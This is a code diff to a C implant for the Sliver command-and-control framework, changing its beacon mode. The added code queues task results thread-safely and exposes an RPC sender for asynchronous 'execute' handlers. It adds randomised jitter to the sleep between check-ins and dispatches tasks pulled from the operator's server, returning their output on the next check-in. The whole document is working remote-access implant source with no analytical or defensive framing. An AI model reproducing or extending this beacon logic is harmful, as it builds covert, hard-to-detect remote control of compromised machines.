@@ -1,8 +1,9 @@
 /* src/modes/beacon.c - beacon register/checkin loop (mtls transport).
  *
- * Mirrors the Go beacon flow: connect -> BeaconRegister -> close, then a loop of
- * connect -> BeaconTasks -> (recv tasks) -> close -> sleep/jitter. Uses the same
- * mTLS + yamux + signed-frame transport as the session loop.
+ * Mirrors the Go beacon flow:
+ *   register: connect -> BeaconRegister -> close
+ *   checkin : connect -> BeaconTasks(pending results) -> (if none) recv tasks
+ *             -> dispatch -> queue results -> close -> sleep(interval+jitter)
  */
 #include "sliver/implant.h"
 
@@ -11,6 +12,7 @@
 #include "sliver/log.h"
 #include "sliver/platform.h"
 #include "sliver/proto.h"
+#include "sliver/rpc.h"
 #include "sliver/transport.h"
 #include "sliver/yamux.h"
 
@@ -31,6 +33,66 @@ typedef struct {
   int yamux_ready;
 } beacon_conn_t;
 
+/* --- pending results queue (thread-safe: async execute results land here) --- */
+#define BEACON_MAX_PENDING 64
+
+typedef struct {
+  sliver_buf_t env[BEACON_MAX_PENDING];
+  size_t count;
+  sliver_mutex_t *lock;
+} beacon_pending_t;
+
+static beacon_pending_t g_pending;
+
+static void pending_init(void) {
+  if (g_pending.lock == NULL) {
+    g_pending.lock = sliver_mutex_create();
+  }
+}
+
+static int pending_push(sliver_buf_t *env) {
+  if (g_pending.lock == NULL || g_pending.count >= BEACON_MAX_PENDING) {
+    return -1;
+  }
+  sliver_mutex_lock(g_pending.lock);
+  if (g_pending.count < BEACON_MAX_PENDING) {
+    g_pending.env[g_pending.count++] = *env; /* move: caller must not free */
+    sliver_mutex_unlock(g_pending.lock);
+    return 0;
+  }
+  sliver_mutex_unlock(g_pending.lock);
+  return -1;
+}
+
+static void pending_clear(void) {
+  size_t i;
+  if (g_pending.lock == NULL) {
+    return;
+  }
+  sliver_mutex_lock(g_pending.lock);
+  for (i = 0; i < g_pending.count; ++i) {
+    sliver_buf_free(&g_pending.env[i]);
+  }
+  g_pending.count = 0;
+  sliver_mutex_unlock(g_pending.lock);
+}
+
+/* rpc sender: async handlers (execute) deliver their result through this. */
+static int beacon_rpc_send(int64_t envelope_id, uint32_t type, const void *data, size_t len) {
+  sliver_buf_t env;
+  sliver_buf_init(&env);
+  if (sliver_envelope_encode(&env, envelope_id, type, data, len) != 0) {
+    sliver_buf_free(&env);
+    return -1;
+  }
+  if (pending_push(&env) != 0) {
+    sliver_buf_free(&env);
+    return -1;
+  }
+  return 0;
+}
+
+/* --- transport + yamux + frame connection --------------------------------- */
 static long b_read(void *ctx, void *buf, size_t len) {
   sliver_transport_t *t = (sliver_transport_t *)ctx;
   return t->read(t, buf, len);
@@ -105,7 +167,6 @@ static void beacon_disconnect(beacon_conn_t *c) {
   }
 }
 
-/* Sends one envelope on a fresh yamux stream. */
 static int beacon_send(beacon_conn_t *c, const void *envelope, size_t len) {
   beacon_stream_t st;
   uint32_t sid = 0;
@@ -123,7 +184,6 @@ static int beacon_send(beacon_conn_t *c, const void *envelope, size_t len) {
   return rc;
 }
 
-/* Reads one envelope from the next server-initiated stream. */
 static int beacon_recv(beacon_conn_t *c, const char *server_pubkey, sliver_buf_t *out) {
   beacon_stream_t st;
   uint32_t sid = 0;
@@ -140,6 +200,41 @@ static int beacon_recv(beacon_conn_t *c, const char *server_pubkey, sliver_buf_t
   return rc;
 }
 
+/* --- jitter --------------------------------------------------------------- */
+static uint64_t beacon_rand_u64(void) {
+  static uint64_t seed = 0;
+  if (seed == 0) {
+    seed = sliver_now_ms() | 1u;
+  }
+  seed ^= seed << 13;
+  seed ^= seed >> 7;
+  seed ^= seed << 17;
+  return seed;
+}
+
+/* Encodes one dispatch result as an Envelope and queues it. */
+static void queue_dispatch_result(int64_t id, uint32_t resp_type, const sliver_buf_t *msg) {
+  sliver_buf_t env;
+  sliver_buf_init(&env);
+  if (sliver_envelope_encode(&env, id, resp_type, msg->data, msg->len) == 0) {
+    if (pending_push(&env) != 0) {
+      sliver_buf_free(&env);
+    }
+  } else {
+    sliver_buf_free(&env);
+  }
+}
+
+static void beacon_dispatch_task(const sliver_envelope_t *task) {
+  sliver_rpc_result_t result;
+  memset(&result, 0, sizeof(result));
+  sliver_rpc_dispatch(task, &result);
+  if (result.handled && !result.no_response) {
+    queue_dispatch_result(task->id, result.resp_type, &result.message);
+  }
+  sliver_rpc_result_free(&result);
+}
+
 int sliver_beacon_run(const char *argv0) {
   sliver_session_config_t cfg;
   char host[256];
@@ -151,13 +246,15 @@ int sliver_beacon_run(const char *argv0) {
   int64_t next_checkin;
   const char *id;
 
-  (void)jitter_ns; /* applied below once jitter scheduling lands */
   if (sliver_session_config_build(&cfg, host, sizeof(host), argv0) != 0) {
     return -1;
   }
   id = sliver_config_build_id()[0] != '\0' ? sliver_config_build_id() : sliver_config_name();
   interval_ms = (uint32_t)((interval_ns > 0 ? interval_ns : 60000000000LL) / 1000000LL);
   next_checkin = (int64_t)((interval_ns > 0 ? interval_ns : 60000000000LL) / 1000000000LL);
+
+  pending_init();
+  sliver_rpc_set_sender(beacon_rpc_send);
 
   /* 1) Register once. */
   err[0] = '\0';
@@ -177,7 +274,9 @@ int sliver_beacon_run(const char *argv0) {
 
   /* 2) Check-in loop. */
   for (;;) {
-    sliver_sleep_ms(interval_ms);
+    uint64_t jitter = (jitter_ns > 0) ? (beacon_rand_u64() % (uint64_t)jitter_ns) : 0;
+    uint32_t sleep_ms = interval_ms + (uint32_t)(jitter / 1000000LL);
+    sliver_sleep_ms(sleep_ms);
 
     err[0] = '\0';
     if (beacon_connect(&cfg, &conn, err, sizeof(err)) != 0) {
@@ -185,26 +284,47 @@ int sliver_beacon_run(const char *argv0) {
       continue;
     }
 
+    /* Send BeaconTasks carrying any pending results. */
     {
       sliver_buf_t env;
       sliver_buf_init(&env);
-      if (sliver_beacon_tasks_encode(&env, id, next_checkin, NULL, 0) == 0) {
+      if (g_pending.count == 0) {
+        (void)sliver_beacon_tasks_encode(&env, id, next_checkin, NULL, 0);
+      } else {
+        sliver_mutex_lock(g_pending.lock);
+        if (sliver_beacon_tasks_encode(&env, id, next_checkin,
+                                       (const sliver_buf_t *const *)g_pending.env,
+                                       g_pending.count) == 0) {
+          /* results have been sent: drop them from the queue */
+          size_t i;
+          for (i = 0; i < g_pending.count; ++i) {
+            sliver_buf_free(&g_pending.env[i]);
+          }
+          g_pending.count = 0;
+        }
+        sliver_mutex_unlock(g_pending.lock);
+      }
+      if (env.len != 0) {
         (void)beacon_send(&conn, env.data, env.len);
       }
       sliver_buf_free(&env);
     }
 
-    {
+    /* With no pending results, the server may return tasks. */
+    if (g_pending.count == 0) {
       sliver_buf_t reply;
       sliver_buf_init(&reply);
       if (beacon_recv(&conn, cfg.server_minisign_pubkey, &reply) == 0 && reply.len != 0) {
         char bid[128];
         int64_t nc = 0;
-        sliver_envelope_t tasks[64];
+        sliver_envelope_t tasks[BEACON_MAX_PENDING];
         size_t task_count = 0;
         if (sliver_beacon_tasks_decode(reply.data, reply.len, bid, sizeof(bid), &nc, tasks,
                                        sizeof(tasks) / sizeof(tasks[0]), &task_count) == 0) {
           LOG_DEBUG("beacon: %u task(s)", (unsigned)task_count);
+          for (size_t i = 0; i < task_count; ++i) {
+            beacon_dispatch_task(&tasks[i]);
+          }
         }
       }
       sliver_buf_free(&reply);
